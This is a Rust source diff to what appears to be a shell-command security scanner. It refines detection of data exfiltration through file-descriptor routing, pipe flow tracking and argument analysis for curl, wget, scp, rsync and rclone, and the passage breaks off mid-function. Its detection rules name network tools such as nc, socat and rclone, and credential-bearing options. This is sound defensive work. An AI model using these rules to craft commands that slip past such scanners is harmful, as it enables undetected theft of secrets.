@@ -852,7 +852,7 @@ pub fn check(
     cwd: Option<&str>,
     scan_context: ScanContext,
 ) -> Vec<Finding> {
-    check_depth(input, shell, cwd, scan_context, 0)
+    check_depth(input, shell, cwd, scan_context, 0, true)
 }
 
 fn check_depth(
@@ -861,6 +861,7 @@ fn check_depth(
     cwd: Option<&str>,
     scan_context: ScanContext,
     depth: usize,
+    analyze_flow: bool,
 ) -> Vec<Finding> {
     let mut findings = Vec::new();
     let (input, segments, mut command_budget_exhausted) =
@@ -932,7 +933,9 @@ fn check_depth(
     check_env_var_in_command(&segments, &mut findings);
     check_network_destination(&segments, &mut findings);
     check_base64_decode_execute(&segments, shell, &mut findings);
-    check_data_exfiltration(&segments, shell, &mut findings);
+    if analyze_flow {
+        let _ = check_data_exfiltration(&segments, shell, &mut findings);
+    }
     check_reverse_shell(&segments, shell, &mut findings);
     check_interpreter_suspicious_inline_exec(&segments, shell, &mut findings);
 
@@ -1027,6 +1030,7 @@ fn check_depth(
                 cwd,
                 scan_context,
                 depth + 1,
+                false,
             ));
         }
     }
@@ -5266,6 +5270,56 @@ enum FlowProof {
     Incomplete,
 }
 
+/// Composable command-frame flow. `Unknown` is not itself a finding: it only
+/// fails closed when a proven security-relevant sink consumes it.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum FlowValue {
+    Clean,
+    Sensitive,
+    Unknown,
+}
+
+impl From<FlowProof> for FlowValue {
+    fn from(value: FlowProof) -> Self {
+        match value {
+            FlowProof::Clean => Self::Clean,
+            FlowProof::Sensitive => Self::Sensitive,
+            FlowProof::Incomplete => Self::Unknown,
+        }
+    }
+}
+
+impl From<FlowValue> for FlowProof {
+    fn from(value: FlowValue) -> Self {
+        match value {
+            FlowValue::Clean => Self::Clean,
+            FlowValue::Sensitive => Self::Sensitive,
+            FlowValue::Unknown => Self::Incomplete,
+        }
+    }
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+struct FlowSummary {
+    stdin: FlowValue,
+    stdout: FlowValue,
+    stderr: FlowValue,
+    redirection_complete: bool,
+    pipe_complete: bool,
+}
+
+impl FlowSummary {
+    fn clean(stdin: FlowProof) -> Self {
+        Self {
+            stdin: stdin.into(),
+            stdout: FlowValue::Clean,
+            stderr: FlowValue::Clean,
+            redirection_complete: true,
+            pipe_complete: true,
+        }
+    }
+}
+
 enum EvaluatedSubstitution {
     Literal(String),
     Sensitive,
@@ -7036,22 +7090,59 @@ fn has_sensitive_stdin_redirection(segment: &tokenize::Segment) -> bool {
     false
 }
 
-fn stdout_is_redirected(segment: &tokenize::Segment, shell: ShellType) -> bool {
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum FdDestination {
+    ParentStdout,
+    ParentStderr,
+    Other,
+    Unknown,
+}
+
+#[derive(Debug, Clone, Copy)]
+struct OrderedFdRouting {
+    stdin: FlowProof,
+    stdout: FdDestination,
+    stderr: FdDestination,
+    complete: bool,
+}
+
+fn redirection_fd_boundary(chars: &[char], start: usize) -> bool {
+    start == 0
+        || chars[start - 1].is_whitespace()
+        || matches!(chars[start - 1], ';' | '|' | '&' | '(' | ')')
+}
+
+fn ordered_fd_routing(
+    segment: &tokenize::Segment,
+    shell: ShellType,
+    incoming: FlowProof,
+    outgoing_separator: Option<&str>,
+) -> OrderedFdRouting {
     let chars = segment.raw.chars().collect::<Vec<_>>();
+    let mut descriptors = BTreeMap::from([
+        (1u8, FdDestination::ParentStdout),
+        (2u8, FdDestination::ParentStderr),
+    ]);
+    let mut stdin = incoming;
+    let mut complete = true;
     let mut quote = None;
     let mut escaped = false;
-    for (index, character) in chars.iter().copied().enumerate() {
+    let escape = match shell {
+        ShellType::PowerShell => '`',
+        ShellType::Cmd => '^',
+        ShellType::Posix | ShellType::Fish => '\\',
+    };
+    let mut index = 0usize;
+    while index < chars.len() {
+        let character = chars[index];
         if escaped {
             escaped = false;
+            index += 1;
             continue;
         }
-        let escape = match shell {
-            ShellType::PowerShell => '`',
-            ShellType::Cmd => '^',
-            ShellType::Posix | ShellType::Fish => '\\',
-        };
         if character == escape && quote != Some('\'') {
             escaped = true;
+            index += 1;
             continue;
         }
         if matches!(character, '\'' | '"') {
@@ -7060,9 +7151,41 @@ fn stdout_is_redirected(segment: &tokenize::Segment, shell: ShellType) -> bool {
             } else if quote.is_none() {
                 quote = Some(character);
             }
+            index += 1;
             continue;
         }
-        if quote.is_some() || character != '>' || chars.get(index + 1) == Some(&'(') {
+        if quote.is_some() {
+            index += 1;
+            continue;
+        }
+
+        // `&>file` redirects both outputs. PowerShell's `*>` is deliberately
+        // unknown here because it includes additional streams beyond fd 1/2.
+        if character == '&' && chars.get(index + 1) == Some(&'>') {
+            descriptors.insert(1, FdDestination::Other);
+            descriptors.insert(2, FdDestination::Other);
+            index += 2;
+            continue;
+        }
+        if character == '*' && chars.get(index + 1) == Some(&'>') {
+            complete = false;
+            descriptors.insert(1, FdDestination::Unknown);
+            descriptors.insert(2, FdDestination::Unknown);
+            index += 2;
+            continue;
+        }
+        if matches!(character, '<' | '>') && chars.get(index + 1) == Some(&'(') {
+            complete = false;
+            if character == '<' {
+                stdin = FlowProof::Incomplete;
+            } else {
+                descriptors.insert(1, FdDestination::Unknown);
+            }
+            index += 2;
+            continue;
+        }
+        if !matches!(character, '<' | '>') {
+            index += 1;
             continue;
         }
 
@@ -7070,30 +7193,178 @@ fn stdout_is_redirected(segment: &tokenize::Segment, shell: ShellType) -> bool {
         while fd_start > 0 && chars[fd_start - 1].is_ascii_digit() {
             fd_start -= 1;
         }
-        if fd_start < index {
-            let io_number_boundary = fd_start == 0
-                || chars[fd_start - 1].is_whitespace()
-                || matches!(chars[fd_start - 1], ';' | '|' | '&' | '(' | ')');
-            if io_number_boundary {
-                let fd = chars[fd_start..index].iter().collect::<String>();
-                if fd != "1" {
-                    continue;
-                }
-            }
-        }
-        let self_duplicate = chars.get(index + 1) == Some(&'&')
-            && chars.get(index + 2) == Some(&'1')
-            && chars
-                .get(index + 3)
-                .is_none_or(|character| !character.is_ascii_digit());
-        if self_duplicate {
+        let explicit_fd = (fd_start < index && redirection_fd_boundary(&chars, fd_start))
+            .then(|| chars[fd_start..index].iter().collect::<String>())
+            .and_then(|value| value.parse::<u8>().ok());
+        let fd = explicit_fd.unwrap_or(if character == '<' { 0 } else { 1 });
+        if character == '<' && chars.get(index + 1) == Some(&'<') {
+            // Heredocs and here-strings have shell-specific expansion rules;
+            // the delimiter word is not a filename and must not be classified
+            // as clean stdin.
+            stdin = FlowProof::Incomplete;
+            complete = false;
+            index += if chars.get(index + 2) == Some(&'<') {
+                3
+            } else {
+                2
+            };
             continue;
         }
-        // Bare `>`/`>>`/`>|` and `&>` redirect stdout. `1>` is handled
-        // above; descriptors such as `2>` and `3>` leave stdout on the pipe.
-        return true;
+        if shell == ShellType::PowerShell && fd > 2 {
+            // PowerShell streams 3-6 are not POSIX descriptors. Until their
+            // success/warning/verbose/debug/information routing is modelled,
+            // any explicit use remains unknown.
+            complete = false;
+        }
+        let mut cursor = index + 1;
+        if chars.get(cursor) == Some(&character) || chars.get(cursor) == Some(&'|') {
+            cursor += 1;
+        }
+        while chars.get(cursor).is_some_and(|value| value.is_whitespace()) {
+            cursor += 1;
+        }
+        if chars.get(cursor) == Some(&'&') {
+            cursor += 1;
+            while chars.get(cursor).is_some_and(|value| value.is_whitespace()) {
+                cursor += 1;
+            }
+            if chars.get(cursor) == Some(&'-') {
+                if fd == 0 {
+                    stdin = FlowProof::Clean;
+                } else {
+                    descriptors.insert(fd, FdDestination::Other);
+                }
+                index = cursor + 1;
+                continue;
+            }
+            let target_start = cursor;
+            while chars
+                .get(cursor)
+                .is_some_and(|value| value.is_ascii_digit())
+            {
+                cursor += 1;
+            }
+            let target = chars[target_start..cursor]
+                .iter()
+                .collect::<String>()
+                .parse::<u8>();
+            match (character, target) {
+                ('>', Ok(target)) => {
+                    let destination = descriptors
+                        .get(&target)
+                        .copied()
+                        .unwrap_or(FdDestination::Unknown);
+                    descriptors.insert(fd, destination);
+                    complete &= destination != FdDestination::Unknown;
+                }
+                ('<', Ok(0)) if fd == 0 => {}
+                ('<', Ok(_)) if fd == 0 => {
+                    stdin = FlowProof::Incomplete;
+                    complete = false;
+                }
+                _ => complete = false,
+            }
+            index = cursor.max(index + 1);
+            continue;
+        }
+
+        let suffix = chars[cursor..].iter().collect::<String>();
+        let target = tokenize::split_words(&suffix).first().cloned();
+        if character == '<' && fd == 0 {
+            stdin = match target.as_deref() {
+                Some(path) if sensitive_operand(path) => FlowProof::Sensitive,
+                Some(_) => FlowProof::Clean,
+                None => FlowProof::Incomplete,
+            };
+            complete &= target.is_some();
+        } else if character == '>' {
+            descriptors.insert(fd, FdDestination::Other);
+            complete &= target.is_some();
+        }
+        index = cursor.max(index + 1);
     }
-    false
+
+    // Bash/Fish `|&` performs an implicit `2>&1` after explicit command
+    // redirections. The copy is ordered: it takes fd 1's destination at this
+    // point, not its original destination.
+    if outgoing_separator == Some("|&") && shell != ShellType::Cmd {
+        let stdout = descriptors
+            .get(&1)
+            .copied()
+            .unwrap_or(FdDestination::Unknown);
+        descriptors.insert(2, stdout);
+        complete &= stdout != FdDestination::Unknown;
+    }
+    OrderedFdRouting {
+        stdin,
+        stdout: descriptors
+            .get(&1)
+            .copied()
+            .unwrap_or(FdDestination::Unknown),
+        stderr: descriptors
+            .get(&2)
+            .copied()
+            .unwrap_or(FdDestination::Unknown),
+        complete,
+    }
+}
+
+fn route_flow(
+    stdout_flow: FlowProof,
+    stderr_flow: FlowProof,
+    routing: OrderedFdRouting,
+) -> (FlowProof, FlowProof) {
+    let mut parent_stdout = FlowProof::Clean;
+    let mut parent_stderr = FlowProof::Clean;
+    for (flow, destination) in [(stdout_flow, routing.stdout), (stderr_flow, routing.stderr)] {
+        match destination {
+            FdDestination::ParentStdout => parent_stdout = merge_flow_proof(parent_stdout, flow),
+            FdDestination::ParentStderr => parent_stderr = merge_flow_proof(parent_stderr, flow),
+            FdDestination::Unknown if flow != FlowProof::Clean => {
+                parent_stdout = merge_flow_proof(parent_stdout, FlowProof::Incomplete);
+                parent_stderr = merge_flow_proof(parent_stderr, FlowProof::Incomplete);
+            }
+            FdDestination::Other | FdDestination::Unknown => {}
+        }
+    }
+    (parent_stdout, parent_stderr)
+}
+
+#[allow(clippy::too_many_arguments)]
+fn accumulate_segment_output(
+    segment_index: usize,
+    pipe_connected: bool,
+    incoming_separator: Option<&str>,
+    outgoing_separator: Option<&str>,
+    parent_stdout: FlowProof,
+    parent_stderr: FlowProof,
+    completed_stdout: &mut FlowProof,
+    completed_stderr: &mut FlowProof,
+    pipeline_stdout: &mut FlowProof,
+    pipeline_stderr: &mut FlowProof,
+) -> FlowProof {
+    if segment_index == 0 || !pipe_connected {
+        *pipeline_stdout = parent_stdout;
+        *pipeline_stderr = parent_stderr;
+    } else {
+        // The next stage consumes the current pipeline's stdout. Ordinary `|`
+        // does not consume stderr, while `|&` does (after ordered fd routing).
+        *pipeline_stdout = parent_stdout;
+        *pipeline_stderr = if incoming_separator == Some("|&") {
+            parent_stderr
+        } else {
+            merge_flow_proof(*pipeline_stderr, parent_stderr)
+        };
+    }
+    if matches!(outgoing_separator, Some("|") | Some("|&")) {
+        parent_stdout
+    } else {
+        *completed_stdout = merge_flow_proof(*completed_stdout, *pipeline_stdout);
+        *completed_stderr = merge_flow_proof(*completed_stderr, *pipeline_stderr);
+        *pipeline_stdout = FlowProof::Clean;
+        *pipeline_stderr = FlowProof::Clean;
+        FlowProof::Clean
+    }
 }
 
 fn form_value_reads_stdin(value: &str) -> bool {
@@ -7121,6 +7392,7 @@ fn upload_value_reads_stdin(value: &str, mode: UploadValueMode) -> bool {
 enum UploadOptionValueKind {
     Upload(UploadValueMode, DataFlowOperation),
     Endpoint,
+    Wire,
     Other,
 }
 
@@ -7257,6 +7529,38 @@ fn upload_option_role<'a>(command: &str, token: &'a str) -> Option<UploadOptionR
                 attached,
             });
         }
+        let wire_value = matches!(
+            (command, name),
+            (
+                "curl",
+                "--cookie"
+                    | "--oauth2-bearer"
+                    | "--proxy-user"
+                    | "--referer"
+                    | "--request-target"
+                    | "--user"
+                    | "--user-agent"
+            ) | (
+                "wget",
+                "--ftp-password"
+                    | "--ftp-user"
+                    | "--header"
+                    | "--http-password"
+                    | "--http-user"
+                    | "--password"
+                    | "--proxy-password"
+                    | "--proxy-user"
+                    | "--referer"
+                    | "--user"
+                    | "--user-agent"
+            )
+        );
+        if wire_value {
+            return Some(UploadOptionRole::Value {
+                kind: UploadOptionValueKind::Wire,
+                attached,
+            });
+        }
         if fetch_option_value(command, token).is_some() {
             return Some(UploadOptionRole::Value {
                 kind: UploadOptionValueKind::Other,
@@ -7290,10 +7594,16 @@ fn upload_option_role<'a>(command: &str, token: &'a str) -> Option<UploadOptionR
                     attached: (!suffix.is_empty()).then_some(suffix),
                 });
             }
+            if matches!(option, 'A' | 'U' | 'b' | 'e' | 'u') {
+                return Some(UploadOptionRole::Value {
+                    kind: UploadOptionValueKind::Wire,
+                    attached: (!suffix.is_empty()).then_some(suffix),
+                });
+            }
             if option == 'x'
                 || [
-                    'A', 'C', 'D', 'E', 'K', 'P', 'Q', 'U', 'X', 'b', 'c', 'e', 'h', 'm', 'o', 'r',
-                    't', 'u', 'w', 'y', 'z', 'Y',
+                    'C', 'D', 'E', 'K', 'P', 'Q', 'X', 'c', 'h', 'm', 'o', 'r', 't', 'w', 'y', 'z',
+                    'Y',
                 ]
                 .contains(&option)
             {
@@ -7341,6 +7651,20 @@ fn upload_destination_proof(
     let destination = match resolve_parsed_word(&parsed, 0) {
         EvaluatedWord::Literal(value) => value,
         EvaluatedWord::Sensitive | EvaluatedWord::Incomplete => {
+            // Substitution bytes may form a URL path/query while the static
+            // prefix still proves the scheme and remote authority. Do not
+            // require the dynamic bytes themselves to be literal in that
+            // case (`https://host/$(producer)`). A dynamic authority remains
+            // incomplete because `https://$(producer)` has no static host.
+            let template = parsed.literal.trim();
+            if url::Url::parse(template).is_ok_and(|url| {
+                matches!(
+                    url.scheme().to_ascii_lowercase().as_str(),
+                    "http" | "https" | "ftp" | "ftps" | "sftp" | "scp" | "ws" | "wss"
+                ) && url.host_str().is_some_and(socket_host_remote)
+            }) {
+                return UploadDestinationProof::Remote;
+            }
             return UploadDestinationProof::Incomplete;
         }
     };
@@ -7374,13 +7698,16 @@ struct UploadTransferAnalysis {
     option_incomplete: bool,
     sensitive_candidate: bool,
     local_upload_paths: Vec<(String, DataFlowOperation)>,
+    wire_argument_indices: BTreeSet<usize>,
 }
 
 struct UploadClientAnalysis {
     direct: DirectUploadAnalysis,
     stdin_remote: bool,
     stdin_incomplete: bool,
+    remote_destination: bool,
     remote_upload_paths: Vec<(String, DataFlowOperation)>,
+    wire_argument_indices: BTreeSet<usize>,
 }
 
 fn apply_upload_option_value(
@@ -7458,20 +7785,22 @@ fn analyze_upload_client(
                             .iter()
                             .any(|substitution| substitution.literal_offset == token.len());
                     let attached = attached.or_else(|| substitution_attached.then_some(""));
-                    let (value_raw, literal_value, advance) = if let Some(value) = attached {
-                        (raw.as_str(), Some(value), 1usize)
-                    } else if let Some(value) = segment.args.get(index + 1) {
-                        transfers.last_mut().unwrap().sensitive_candidate |=
-                            crate::sensitive_assets::tier1_sensitive_asset_candidate(value);
-                        (value.as_str(), None, 2usize)
-                    } else {
-                        transfers.last_mut().unwrap().option_incomplete = true;
-                        index += 1;
-                        continue;
-                    };
+                    let (value_raw, literal_value, value_index, advance) =
+                        if let Some(value) = attached {
+                            (raw.as_str(), Some(value), index, 1usize)
+                        } else if let Some(value) = segment.args.get(index + 1) {
+                            transfers.last_mut().unwrap().sensitive_candidate |=
+                                crate::sensitive_assets::tier1_sensitive_asset_candidate(value);
+                            (value.as_str(), None, index + 1, 2usize)
+                        } else {
+                            transfers.last_mut().unwrap().option_incomplete = true;
+                            index += 1;
+                            continue;
+                        };
                     let transfer = transfers.last_mut().unwrap();
                     match kind {
                         UploadOptionValueKind::Upload(mode, operation) => {
+                            transfer.wire_argument_indices.insert(value_index);
                             apply_upload_option_value(
                                 transfer,
                                 value_raw,
@@ -7482,6 +7811,7 @@ fn analyze_upload_client(
                             );
                         }
                         UploadOptionValueKind::Endpoint => {
+                            transfer.wire_argument_indices.insert(value_index);
                             match upload_destination_proof(value_raw, shell, literal_value) {
                                 UploadDestinationProof::Remote => {
                                     transfer.remote_destination = true
@@ -7492,6 +7822,9 @@ fn analyze_upload_client(
                                 UploadDestinationProof::NonRemote => {}
                             }
                         }
+                        UploadOptionValueKind::Wire => {
+                            transfer.wire_argument_indices.insert(value_index);
+                        }
                         UploadOptionValueKind::Other => {}
                     }
                     index += advance;
@@ -7501,7 +7834,10 @@ fn analyze_upload_client(
         }
         let transfer = transfers.last_mut().unwrap();
         match upload_destination_proof(raw, shell, None) {
-            UploadDestinationProof::Remote => transfer.remote_destination = true,
+            UploadDestinationProof::Remote => {
+                transfer.remote_destination = true;
+                transfer.wire_argument_indices.insert(index);
+            }
             UploadDestinationProof::Incomplete => transfer.destination_incomplete = true,
             UploadDestinationProof::NonRemote => {}
         }
@@ -7512,8 +7848,11 @@ fn analyze_upload_client(
     let mut direct_incomplete = false;
     let mut stdin_remote = false;
     let mut stdin_incomplete = false;
+    let mut remote_destination = false;
     let mut remote_upload_paths = Vec::new();
+    let mut wire_argument_indices = BTreeSet::new();
     for transfer in transfers {
+        remote_destination |= transfer.remote_destination;
         if let Some(sensitive) = transfer.sensitive_upload {
             if transfer.remote_destination && !transfer.option_incomplete {
                 precise.get_or_insert(sensitive);
@@ -7544,6 +7883,7 @@ fn analyze_upload_client(
         }
         if transfer.remote_destination && !transfer.option_incomplete {
             remote_upload_paths.extend(transfer.local_upload_paths);
+            wire_argument_indices.extend(transfer.wire_argument_indices);
         }
     }
     let direct = if let Some((source, operation)) = precise {
@@ -7557,7 +7897,9 @@ fn analyze_upload_client(
         direct,
         stdin_remote,
         stdin_incomplete,
+        remote_destination,
         remote_upload_paths,
+        wire_argument_indices,
     }
 }
 
@@ -7678,12 +8020,57 @@ fn proven_remote_http(value: &str) -> bool {
         .is_some_and(|host| socket_host_remote(&host))
 }
 
+fn security_relevant_argument_flow(
+    command: &str,
+    args: &[String],
+    shell: ShellType,
+    argument_flows: &BTreeMap<usize, FlowProof>,
+    upload_indices: &BTreeSet<usize>,
+) -> FlowProof {
+    let selected = match command {
+        "curl" | "wget" => Some(upload_indices.clone()),
+        // For copy commands, only the remote destination operand carries its
+        // literal value over the wire. A substitution in a local source
+        // operand may merely produce a filename.
+        "scp" | "rsync" => remote_copy_wire_argument_indices(command, args, shell).ok(),
+        "rclone" => rclone_wire_argument_indices(args, shell).ok(),
+        // These analyzers prove the sink independently. Their finer-grained
+        // option-role projection is retained below until each parser returns
+        // exact indices like curl/wget and remote-copy do.
+        "http" | "https" | "xh" | "nc" | "ncat" | "netcat" | "socat" | "dig" | "nslookup"
+        | "resolve-dnsname" | "invoke-webrequest" | "iwr" | "invoke-restmethod" | "irm" => None,
+        _ => Some(BTreeSet::new()),
+    };
+    if let Some(indices) = selected {
+        indices
+            .into_iter()
+            .filter_map(|index| argument_flows.get(&index).copied())
+            .chain(argument_flows.get(&usize::MAX).copied())
+            .fold(FlowProof::Clean, merge_flow_proof)
+    } else {
+        argument_flows
+            .values()
+            .copied()
+            .fold(FlowProof::Clean, merge_flow_proof)
+    }
+}
+
 fn positional_arguments_closed(
     args: &[String],
     shell: ShellType,
     value_options: &[&str],
     boolean_options: &[&str],
 ) -> Result<Vec<String>, ()> {
+    positional_arguments_with_indices_closed(args, shell, value_options, boolean_options)
+        .map(|positionals| positionals.into_iter().map(|(_, value)| value).collect())
+}
+
+fn positional_arguments_with_indices_closed(
+    args: &[String],
+    shell: ShellType,
+    value_options: &[&str],
+    boolean_options: &[&str],
+) -> Result<Vec<(usize, String)>, ()> {
     let mut positional = Vec::new();
     let mut options = true;
     let mut index = 0usize;
@@ -7716,7 +8103,7 @@ fn positional_arguments_closed(
             }
             return Err(());
         }
-        positional.push(value);
+        positional.push((index, value));
         index += 1;
     }
     Ok(positional)
@@ -7824,8 +8211,10 @@ fn analyze_httpie_sink(
     }
 }
 
-fn analyze_remote_copy_sink(command: &str, args: &[String], shell: ShellType) -> ExtendedSinkProof {
-    let (value_options, boolean_options): (&[&str], &[&str]) = match command {
+fn remote_copy_option_roles(
+    command: &str,
+) -> Option<(&'static [&'static str], &'static [&'static str])> {
+    Some(match command {
         "scp" => (
             &[
                 "-B", "-c", "-D", "-F", "-i", "-J", "-l", "-o", "-P", "-S", "-X",
@@ -7870,7 +8259,44 @@ fn analyze_remote_copy_sink(command: &str, args: &[String], shell: ShellType) ->
                 "-s",
             ],
         ),
-        _ => return ExtendedSinkProof::None,
+        _ => return None,
+    })
+}
+
+fn remote_copy_operand_is_remote(command: &str, value: &str, shell: ShellType) -> bool {
+    crate::extract::parse_scp_remote_spec(value, shell).is_some()
+        || url::Url::parse(value).is_ok_and(|url| match command {
+            "scp" => url.scheme() == "scp" && url.host_str().is_some_and(socket_host_remote),
+            "rsync" => {
+                matches!(url.scheme(), "rsync" | "ssh")
+                    && url.host_str().is_some_and(socket_host_remote)
+            }
+            _ => false,
+        })
+}
+
+fn remote_copy_wire_argument_indices(
+    command: &str,
+    args: &[String],
+    shell: ShellType,
+) -> Result<BTreeSet<usize>, ()> {
+    let Some((value_options, boolean_options)) = remote_copy_option_roles(command) else {
+        return Ok(BTreeSet::new());
+    };
+    let positional =
+        positional_arguments_with_indices_closed(args, shell, value_options, boolean_options)?;
+    let Some((index, destination)) = positional.last() else {
+        return Ok(BTreeSet::new());
+    };
+    Ok(remote_copy_operand_is_remote(command, destination, shell)
+        .then_some(*index)
+        .into_iter()
+        .collect())
+}
+
+fn analyze_remote_copy_sink(command: &str, args: &[String], shell: ShellType) -> ExtendedSinkProof {
+    let Some((value_options, boolean_options)) = remote_copy_option_roles(command) else {
+        return ExtendedSinkProof::None;
     };
     let positional = match positional_arguments_closed(args, shell, value_options, boolean_options)
     {
@@ -7881,24 +8307,13 @@ fn analyze_remote_copy_sink(command: &str, args: &[String], shell: ShellType) ->
         return ExtendedSinkProof::None;
     }
     let destination = positional.last().unwrap();
-    let remote_url = |value: &str| {
-        url::Url::parse(value).is_ok_and(|url| match command {
-            "scp" => url.scheme() == "scp" && url.host_str().is_some_and(socket_host_remote),
-            "rsync" => {
-                matches!(url.scheme(), "rsync" | "ssh")
-                    && url.host_str().is_some_and(socket_host_remote)
-            }
-            _ => false,
-        })
-    };
-    let destination_remote = crate::extract::parse_scp_remote_spec(destination, shell).is_some()
-        || remote_url(destination);
+    let destination_remote = remote_copy_operand_is_remote(command, destination, shell);
     if !destination_remote {
         return ExtendedSinkProof::None;
     }
     let mut source_sensitive = false;
     for source in &positional[..positional.len() - 1] {
-        if crate::extract::parse_scp_remote_spec(source, shell).is_some() || remote_url(source) {
+        if remote_copy_operand_is_remote(command, source, shell) {
             continue;
         }
         source_sensitive |= sensitive_operand(source);
@@ -7935,30 +8350,57 @@ fn rclone_remote(value: &str) -> bool {
         && !(remote.len() == 1 && remote.as_bytes()[0].is_ascii_alphabetic())
 }
 
+const RCLONE_VALUE_OPTIONS: &[&str] = &[
+    "--config",
+    "--password-command",
+    "--bwlimit",
+    "--transfers",
+    "--checkers",
+    "--timeout",
+    "--contimeout",
+    "--retries",
+];
+const RCLONE_BOOLEAN_OPTIONS: &[&str] = &[
+    "-v",
+    "-q",
+    "--verbose",
+    "--quiet",
+    "--dry-run",
+    "--checksum",
+    "--progress",
+    "--immutable",
+];
+
+fn rclone_wire_argument_indices(args: &[String], shell: ShellType) -> Result<BTreeSet<usize>, ()> {
+    let positional = positional_arguments_with_indices_closed(
+        args,
+        shell,
+        RCLONE_VALUE_OPTIONS,
+        RCLONE_BOOLEAN_OPTIONS,
+    )?;
+    let destination = match positional.as_slice() {
+        [(_, verb), destination] if verb == "rcat" && rclone_remote(&destination.1) => {
+            Some(destination.0)
+        }
+        [(_, verb), _, destination]
+            if matches!(
+                verb.as_str(),
+                "copy" | "copyto" | "sync" | "move" | "moveto"
+            ) && rclone_remote(&destination.1) =>
+        {
+            Some(destination.0)
+        }
+        _ => None,
+    };
+    Ok(destination.into_iter().collect())
+}
+
 fn analyze_rclone_sink(args: &[String], shell: ShellType) -> ExtendedSinkProof {
     let positional = match positional_arguments_closed(
         args,
         shell,
-        &[
-            "--config",
-            "--password-command",
-            "--bwlimit",
-            "--transfers",
-            "--checkers",
-            "--timeout",
-            "--contimeout",
-            "--retries",
-        ],
-        &[
-            "-v",
-            "-q",
-            "--verbose",
-            "--quiet",
-            "--dry-run",
-            "--checksum",
-            "--progress",
-            "--immutable",
-        ],
+        RCLONE_VALUE_OPTIONS,
+        RCLONE_BOOLEAN_OPTIONS,
     ) {
         Ok(positional) => positional,
         Err(()) => return ExtendedSinkProof::Incomplete,
@@ -8406,11 +8848,124 @@ fn analyze_dns_sink(command: &str, args: &[String], shell: ShellType) -> Extende
 const MAX_STAGED_DATAFLOW_PATHS: usize = 64;
 const MAX_STAGED_DATAFLOW_PATH_BYTES: usize = 4096;
 
-#[derive(Debug, Default)]
+#[derive(Debug, Clone, Default)]
 struct StagedDataflow {
     paths: BTreeMap<String, DataFlowOperation>,
     uncertain_paths: BTreeSet<String>,
     exhausted: bool,
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum StaticCommandOutcome {
+    Success,
+    Failure,
+    Unknown,
+}
+
+fn merge_staged_dataflow(target: &mut StagedDataflow, alternate: StagedDataflow) {
+    target.exhausted |= alternate.exhausted;
+    for (path, operation) in alternate.paths {
+        target.uncertain_paths.remove(&path);
+        if target.paths.contains_key(&path) {
+            continue;
+        }
+        if target.paths.len() >= MAX_STAGED_DATAFLOW_PATHS {
+            target.exhausted = true;
+            continue;
+        }
+        target.paths.insert(path, operation);
+    }
+    for path in alternate.uncertain_paths {
+        if target.paths.contains_key(&path) || target.uncertain_paths.contains(&path) {
+            continue;
+        }
+        if target.uncertain_paths.len() >= MAX_STAGED_DATAFLOW_PATHS {
+            target.exhausted = true;
+            continue;
+        }
+        target.uncertain_paths.insert(path);
+    }
+}
+
+/// Compute the state visible on the failure arm of a command whose exit status
+/// is not statically known. A failing process may still have created,
+/// truncated, appended to, renamed, or linked an output before returning
+/// non-zero. Treat every state change between entry and observed post-state as
+/// uncertain; facts that are identical on both sides remain proven.
+fn unknown_failure_staged_entry(entry: &StagedDataflow, post: &StagedDataflow) -> StagedDataflow {
+    let mut joined = StagedDataflow {
+        exhausted: entry.exhausted || post.exhausted,
+        ..StagedDataflow::default()
+    };
+    let mut keys = BTreeSet::new();
+    keys.extend(entry.paths.keys().cloned());
+    keys.extend(entry.uncertain_paths.iter().cloned());
+    keys.extend(post.paths.keys().cloned());
+    keys.extend(post.uncertain_paths.iter().cloned());
+    for key in keys {
+        let entry_sensitive = entry.paths.get(&key);
+        let post_sensitive = post.paths.get(&key);
+        let entry_uncertain = entry.uncertain_paths.contains(&key);
+        let post_uncertain = post.uncertain_paths.contains(&key);
+        if entry_sensitive.is_some()
+            && post_sensitive.is_some()
+            && !entry_uncertain
+            && !post_uncertain
+        {
+            if joined.paths.len() >= MAX_STAGED_DATAFLOW_PATHS {
+                joined.exhausted = true;
+            } else {
+                joined.paths.insert(
+                    key,
+                    entry_sensitive
+                        .copied()
+                        .unwrap_or(DataFlowOperation::TemporaryFile),
+                );
+            }
+        } else if entry_sensitive.is_some()
+            || post_sensitive.is_some()
+            || entry_uncertain
+            || post_uncertain
+        {
+            if joined.uncertain_paths.len() >= MAX_STAGED_DATAFLOW_PATHS {
+                joined.exhausted = true;
+            } else {
+                joined.uncertain_paths.insert(key);
+            }
+        }
+    }
+    joined
+}
+
+fn degrade_staged_dataflow_to_uncertain(staged: &mut StagedDataflow) {
+    let sensitive_paths = std::mem::take(&mut staged.paths);
+    for path in sensitive_paths.into_keys() {
+        if staged.uncertain_paths.len() >= MAX_STAGED_DATAFLOW_PATHS
+            && !staged.uncertain_paths.contains(&path)
+        {
+            staged.exhausted = true;
+            continue;
+        }
+        staged.uncertain_paths.insert(path);
+    }
+}
+
+fn static_command_outcome(
+    segment: &tokenize::Segment,
+    command: &str,
+    shell: ShellType,
+) -> StaticCommandOutcome {
+    if !matches!(shell, ShellType::Posix | ShellType::Fish)
+        || !segment.args.is_empty()
+        || normalize_shell_token(segment.raw.trim(), shell) != command
+    {
+        return StaticCommandOutcome::Unknown;
+    }
+    match command {
+        ":" | "true" => StaticCommandOutcome::Success,
+        "false" => StaticCommandOutcome::Failure,
+        _ => StaticCommandOutcome::Unknown,
+    }
 }
 
 fn staged_path_key(raw: &str, shell: ShellType) -> Result<String, ()> {
@@ -8429,6 +8984,19 @@ fn staged_path_key(raw: &str, shell: ShellType) -> Result<String, ()> {
     while key.contains("//") {
         key = key.replace("//", "/");
     }
+    let absolute = key.starts_with('/');
+    let components = key
+        .split('/')
+        .filter(|component| !component.is_empty() && *component != ".")
+        .collect::<Vec<_>>();
+    if components.is_empty() && !absolute {
+        return Err(());
+    }
+    key = if absolute {
+        format!("/{}", components.join("/"))
+    } else {
+        components.join("/")
+    };
     if matches!(shell, ShellType::PowerShell | ShellType::Cmd) {
         key.make_ascii_lowercase();
     }
@@ -8728,6 +9296,511 @@ fn staged_argument_relevance(
     })
 }
 
+fn record_staged_output(
+    staged: &mut StagedDataflow,
+    raw_path: &str,
+    shell: ShellType,
+    append: bool,
+    flow: FlowProof,
+    operation: DataFlowOperation,
+) {
+    let Ok(key) = staged_path_key(raw_path, shell) else {
+        if flow != FlowProof::Clean {
+            staged.exhausted = true;
+        }
+        return;
+    };
+    if !append {
